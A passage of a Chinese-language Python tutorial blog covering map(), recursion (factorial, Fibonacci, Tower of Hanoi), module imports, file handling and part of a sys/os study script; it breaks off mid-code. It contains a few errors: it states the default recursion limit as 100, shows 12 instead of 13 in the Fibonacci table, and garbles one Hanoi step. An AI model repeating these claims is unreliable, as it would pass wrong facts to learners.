punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#68>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>TypeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'NoneType'</span> <span class=\"token builtin\">object</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">callable</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#空类型不能调用</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">map</span> <span class=\"token builtin\">object</span> at <span class=\"token number\">0x000001DC49317A60</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"递归\"><a class=\"anchor\" href=\"#递归\">#</a> 递归</h3>\n<p>什么是递归？递归，就是在运行的过程中调用自己。</p>\n<p>先举个实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">re</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#3>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#2>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> re</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#2>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> re</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#2>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> re</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">[</span>Previous line repeated <span class=\"token number\">1022</span> more times<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>RecursionError<span class=\"token punctuation\">:</span> maximum recursion depth exceeded</pre></td></tr></table></figure><p>这就是初学者玩递归最容易出现的错误。从理论上讲这个程序将永远执行下去直至耗尽所有内存资源。不过 Python3 出于 “善意的保护”，对递归的深度默认限制是 100 层，所以你的代码才会停下来。不过如果你写网络爬虫等工具，可能会爬得很深，那你也可以自己设置递归的深度限制。方法如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> sys<span class=\"token punctuation\">.</span>setrecursionlimit<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#将递归限制设置为 100 万层</span></pre></td></tr></table></figure><p>写一个求阶乘的函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 非递归版本 （迭代）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">re</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        result <span class=\"token operator\">=</span> n</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            result <span class=\"token operator\">*=</span> i</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> re<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">720</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#递归版本</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">recursion</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">return</span> n<span class=\"token operator\">*</span> recursion<span class=\"token punctuation\">(</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">720</span></pre></td></tr></table></figure><p>有一句话 “普通程序员用迭代，天才程序员用递归”。但并不是把所有的迭代都用递归代替就是 “天才程序员”，恰恰相反。因为递归的实现是函数调用自己，每次函数的调用都需要进行压栈、弹栈、保存和恢复寄存器的栈操作，所以会非常消耗时间和空间的。不过，存在即合理，没必要讨论那个好。递归用在妙处，自然代码简洁、精炼。</p>\n<p>斐波那契数列</p>\n<p>斐波那契数列是意大利数学家列昂纳多・斐波那契发明的。</p>\n<p>问题：如果兔子在出生两个月后就拥有繁衍能力，这对兔子每个月能生一对小兔子来，假设所有兔子都不会死亡，那么一年后会有多少兔子？</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:right\">月数</th>\n<th style=\"text-align:right\">1</th>\n<th style=\"text-align:right\">2</th>\n<th style=\"text-align:right\">3</th>\n<th style=\"text-align:right\">4</th>\n<th style=\"text-align:right\">5</th>\n<th style=\"text-align:right\">6</th>\n<th style=\"text-align:right\">7</th>\n<th style=\"text-align:right\">8</th>\n<th style=\"text-align:right\">9</th>\n<th style=\"text-align:right\">10</th>\n<th style=\"text-align:right\">11</th>\n<th style=\"text-align:right\">12</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:right\">兔子</td>\n<td style=\"text-align:right\">1</td>\n<td style=\"text-align:right\">1</td>\n<td style=\"text-align:right\">2</td>\n<td style=\"text-align:right\">3</td>\n<td style=\"text-align:right\">5</td>\n<td style=\"text-align:right\">8</td>\n<td style=\"text-align:right\">12</td>\n<td style=\"text-align:right\">21</td>\n<td style=\"text-align:right\">34</td>\n<td style=\"text-align:right\">55</td>\n<td style=\"text-align:right\">89</td>\n<td style=\"text-align:right\">144</td>\n</tr>\n</tbody>\n</table>\n<p>用数学函数来定义</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#不会 md 文件的数学语法（我是笨比）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>          <span class=\"token number\">1</span>               当n<span class=\"token operator\">=</span><span class=\"token number\">1</span>时</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>F<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token number\">1</span>               当n<span class=\"token operator\">=</span><span class=\"token number\">2</span>时    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>          F<span class=\"token punctuation\">(</span>n-1<span class=\"token punctuation\">)</span>+F<span class=\"token punctuation\">(</span>n-2<span class=\"token punctuation\">)</span>   当n<span class=\"token operator\">></span><span class=\"token number\">2</span>时</pre></td></tr></table></figure><p>假设需要求 20 个月后有多少只兔子</p>\n<p>迭代实现</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        a <span class=\"token operator\">=</span> b <span class=\"token operator\">=</span> c <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入有误\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            c <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            a <span class=\"token operator\">=</span> b</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            b <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            n <span class=\"token operator\">-=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">6765</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">144</span></pre></td></tr></table></figure><p>递归实现</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">recursion</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> n<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入有误\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token keyword\">or</span> n <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> recursion<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> recursion<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">6765</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">144</span></pre></td></tr></table></figure><p>当你把 20 个月调成 35 个月时</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token number\">35</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#毫秒级就完成运算了</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">9227465</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">35</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#大概有 3 秒才完成运算</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">9227465</span></pre></td></tr></table></figure><p>为了体现递归正确的使用优势。<br />\n来看一看汉诺塔难题。</p>\n<p>规则是有三根铁针，其中一根针上从下到上穿好了由大到小的 n 个盘子，这些金片一次只能移动一片，不管在那根针上小盘必须在大盘上面，要把所有盘子从一根针上移动到另一根针上。</p>\n<blockquote>\n<p>我们先来分析思路<br />\n对于游戏的玩法，可以简单分解为三个步骤:<br />\n1. 首先将前 n-1 个盘子从 X 移动到 Y 上，确保大盘在小盘下。<br />\n2. 将最底下的第 n 个盘子移动在 Z 上<br />\n 3. 将 Y 上的 n-1 个盘子移动到 Z 上</p>\n</blockquote>\n<p>想要实现步骤 1 和 3，都必须要借助另一个针，接着分析问题<br />\n问题一：步骤 1 将 X 针上的 1~n-1 个盘子需要借助 Z 移动到 Y 上；<br />\n问题二：步骤 3 将 Y 针上的 n-1 个盘子需要借助 X 移动到 Z 上。<br />\n而解决这两个问题的方法跟刚才的思路一样都可分成三个步骤。</p>\n<p>问题一（将 X 针上的 1~n-1 个盘子借助 Z 移动到 Y 上）拆解：<br />\n（1）首先将前 n-2 个盘子从 X 移动到 Z 上，确保大盘在小盘下。<br />\n（2）将最底下的第 n-1 个盘子移动在 Y 上<br />\n（3）将 Y 上的 n-2 个盘子移动到 Y 上</p>\n<p>问题二（将 Y 针上的 n-1 个盘子借助 X 移动到 Z 上）拆解：<br />\n（1）首先将前 n-2 个盘子从 Y 移动到 X 上，确保大盘在小盘下。<br />\n（2）将最底下的第 n-1 个盘子移动在 Z 上<br />\n（3）将 X 上的 n-2 个盘子移动到 Y 上</p>\n<p>没错拆解过程刚好满足递归算法的定义，因此可以使用递归来解决。<br />\n参考代码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">hanoi</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> n<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token string\">'-->'</span><span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            hanoi<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token string\">'-->'</span><span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            hanoi<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> n <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> hanoi<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span><span class=\"token string\">'X'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Y'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Z'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Y</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Z <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Y</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Y <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> X</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Y <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr></table></figure><h2 id=\"模块包以及文件处理\"><a class=\"anchor\" href=\"#模块包以及文件处理\">#</a> 模块 / 包以及文件处理</h2>\n<h3 id=\"模块包\"><a class=\"anchor\" href=\"#模块包\">#</a> 模块 / 包</h3>\n<p>模块： .py 文件<br />\n包： python package</p>\n<p>模块：模块是函数和类的集合；在 python 中一个文件既是一个模块。<br />\n包：包是模块的集合；将多个模块放在一个文件夹内，就形成了一个包。</p>\n<h3 id=\"导入模块\"><a class=\"anchor\" href=\"#导入模块\">#</a> 导入模块</h3>\n<p>1，improt 模块名</p>\n<p>调用：模块名。功能名</p>\n<p>2，import 模块名 as 别名</p>\n<p>调用：别名。功能名</p>\n<p>3，from 模块名 import 功能名</p>\n<p>调用：直接功能名</p>\n<p>4，from 模块名 import 功能名 as 别名</p>\n<p>调用： 直接拿别名来用</p>\n<p>5，from 模块名 import * （用 * 号 一次性导入所有功能）</p>\n<p>调用：直接功能名</p>\n<p>注意点：* 号没法用别名</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzQ2NDUuaHRtbA==\">导入模块详解</span></p>\n<h3 id=\"文件处理\"><a class=\"anchor\" href=\"#文件处理\">#</a> 文件处理</h3>\n<p>a. 操作模式：r、w、a、b</p>\n<p>b. 读<br />\n①read (): 读取文件中的所有内容<br />\n②readline (): 读取单行内容<br />\n③readlines (): 以行的形式读取所有内容，返回一个包含了每一行的序列</p>\n<p>c. 写<br />\n①write (写入内容)：将指定内容写入文件中<br />\n②writelines (序列)：将序列中的每一元素，作为单独的行，按照行的形式写入</p>\n<p>d. 其他<br />\n①tell (): 返回光标当前所在的位置<br />\n②seek (步长，起始位置): 将光标移动到指定的位置<br />\n (0,0) 表示移动光标到文章最开头的地方</p>\n<h1 id=\"sys和os库复习\"><a class=\"anchor\" href=\"#sys和os库复习\">#</a> sys 和 os 库复习</h1>\n<p>os、os.path 模块中关于文件、目录常用的函数使用方法 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tva282Ni9hcnRpY2xlL2RldGFpbHMvNDI3MDkzMTM=\">https://blog.csdn.net/koko66/article/details/42709313</span></p>\n<p>这是以前的代码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># @FileName  :sys_os_module.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># @Author    :1asy</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># @motto     :</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 不深思则不能造于道。不深思而得者，其得易失。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>学习sys与os模块</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sys模块的常见函数列表</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sys.argv: 实现从程序外部向程序传递参数。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sys.exit([arg]): 程序中间的退出，arg=0为正常退出。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys.stdout.write('please:'):标准输出，引出进度条的例子</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sys.getrecursionlimit() :获取最大递归层数</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sys.setrecursionlimit(1200):设置最大递归层数</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sys.getdefaultencoding(): 获取系统当前编码，一般默认为ascii。</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sys.setdefaultencoding(): 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>可以先执行reload(sys)，在执行 setdefaultencoding('utf8')，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sys.getfilesystemencoding(): 获取文件系统使用编码方式，Windows下返回'mbcs'，mac下返回'utf-8'.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sys.path: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sys.platform: 获取当前系统平台。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sys.stdin,</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sys.stdout,</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sys.stderr: stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象.</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的. 你也可以替换它们,</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sys.exit()</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sys.path</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sys.stdin</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>sys.stdout</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sys.stderr</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sys.argv</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">globmodule</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    这个模块可以列出特定工作目录内容，并且支持使用通配符 \"*\" ,  如：\"*.py\"</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">import</span> glob</pre></td></tr><tr><td 